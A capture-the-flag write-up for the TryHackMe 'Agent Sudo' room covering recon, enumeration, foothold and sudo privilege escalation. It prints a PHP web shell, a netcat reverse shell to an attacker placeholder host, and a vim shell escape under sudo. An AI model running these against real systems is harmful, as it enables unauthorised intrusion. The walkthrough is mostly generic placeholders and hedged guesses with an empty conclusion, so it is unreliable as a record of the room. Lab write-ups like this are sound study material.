# Agent Sudo — TryHackMe Writeup

**Author:** Koushiq Murad  
**Room:** Agent Sudo (TryHackMe)  
---

## Table of Contents
1. [Overview](#overview)  
2. [Tools & Environment](#tools--environment)  
3. [Initial Recon (nmap)](#initial-recon-nmap)  
4. [Enumeration](#enumeration)  
5. [Exploitation — Gaining Foothold](#exploitation---gaining-foothold)  
6. [Privilege Escalation](#privilege-escalation)  
7. [Post-Exploitation & Flags](#post-exploitation--flags)  
8. [Cleanup & Notes](#cleanup--notes)  
9. [References](#references)

---

## Overview

This writeup documents the steps taken to compromise the `Agent Sudo` machine on TryHackMe. The target involves enumeration, discovery of a service or misconfiguration that allows code execution or credential access, and privilege escalation via a sudo misconfiguration or allowed command.

---

## Tools & Environment

- Kali Linux (or any pentest distro)
- nmap
- gobuster (optional)
- curl / wget
- ssh
- linpeas / linenum (for local enumeration)
- sudo -l, id, whoami, find, /etc/passwd examination
- netcat (nc)

---

## 1) Initial Recon (nmap)

Run a quick nmap discovery scan to find open ports and services:

```bash
# Full TCP scan with default scripts and version detection
nmap -sC -sV -p- -T4 <TARGET_IP> -oN nmap_full.txt
```

Typical useful results to look for:
- SSH (22)
- HTTP (80/8080)
- FTP (21)
- SMB (445)
- Other custom services

Open ports discovered should be enumerated further (visit web pages, banner grabbing, anonymous ftp, etc).

---

## 2) Enumeration

### Web service
If a web service is discovered, run gobuster to find hidden directories:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

Look for:
- admin panels
- backup files (.bak, .tar, .zip)
- credentials in files like `config.php`, `.env`, or `backup.zip`

### FTP / SMB
- Try anonymous login on FTP:
```bash
ftp <TARGET_IP>
# or using curl:
curl ftp://<TARGET_IP>/
```
- If files are accessible, download and inspect them for credentials or scripts.

### SSH
- If valid credentials are found (from web or ftp), attempt SSH:
```bash
ssh user@<TARGET_IP>
```

---

## 3) Exploitation — Gaining Foothold

Common foothold methods shown in walkthroughs:

- **Credential leak from web files** — find a password in a config file and use it to SSH in.
- **File upload / command injection** — if a web path allows uploading or executing scripts, use it to get a reverse shell.
- **Exposed service with default credentials** — e.g., admin:admin on some web panels.

Example reverse shell (PHP) if a writable web directory is available:

```php
<?php system($_GET['cmd']); ?>
```

Then call:
```
http://<TARGET_IP>/shell.php?cmd=nc -e /bin/bash <ATTACKER_IP> <LISTENER_PORT>
```
(Replace with a safe, allowed payload and listener `nc -lvnp <LISTENER_PORT>`.)

---

## 4) Privilege Escalation

Once you have a shell as a low-privilege user, perform local enumeration. Useful commands:

```bash
# Basic info
id
uname -a
cat /etc/os-release

# Check sudo rights
sudo -l

# Search for suid binaries and writable files
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null

# Check running services
ps aux
```

**Key idea for Agent Sudo:** the name implies a sudo-related escalation. `sudo -l` may reveal allowed commands for the current user without a password, for example allowing execution of a certain script or binary as root. If the allowed command can be abused (e.g., it allows editing files, spawning a shell, running a text editor, or passing unsanitized arguments), escalate to root.

Example flows:

1. `sudo -l` shows a command like:
```
(user) NOPASSWD: /usr/bin/some-script
```

2. If `/usr/bin/some-script` allows writing to a file or accepts arguments you can inject, you can replace/abuse it. For instance, run the script under root and use it to spawn a shell:

```bash
sudo /usr/bin/some-script
# if the script allows passing a command or editing a file, leverage that
```

3. If `sudo` allows running editors like `vim` or `less` as root, you can spawn a shell:
```bash
sudo vim -c ':!sh' -c ':q'
```

Or use `sudo tee` to write a new root cronjob or a new suid binary.

---

## 5) Post-Exploitation & Flags

- Read user and root flags:
```bash
# user flag
cat /home/<user>/user.txt

# root flag
sudo -i
cat /root/root.txt
```

- Collect system information for reporting: `/etc/passwd`, `/var/log`, cron jobs, ssh keys in `/root/.ssh/`.

---

## 6) Cleanup & Notes

- Always follow TryHackMe rules — this is a lab environment. For real engagements, get written permission.
- Remove any files you uploaded (if you were on a real system).
- Document all commands, outputs, and timestamps for your GitHub writeup (helps in reports).

---

## Example Commands Log (for your report)

```bash
# Recon
nmap -sC -sV -p- -T4 <TARGET_IP> -oN nmap_full.txt

# Web enumeration
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt

# If credential found (example)
ssh agent@<TARGET_IP>
# password: some_password_from_config

# Local enumeration
id
sudo -l
find / -perm -4000 -type f 2>/dev/null

# Privilege escalation (example)
sudo /usr/bin/some-script
# or
sudo vim -c ':!sh' -c ':q'

# Flags
cat /home/agent/user.txt
cat /root/root.txt
```

---

## Conclusion

---

**Author:** Koushiq Murad
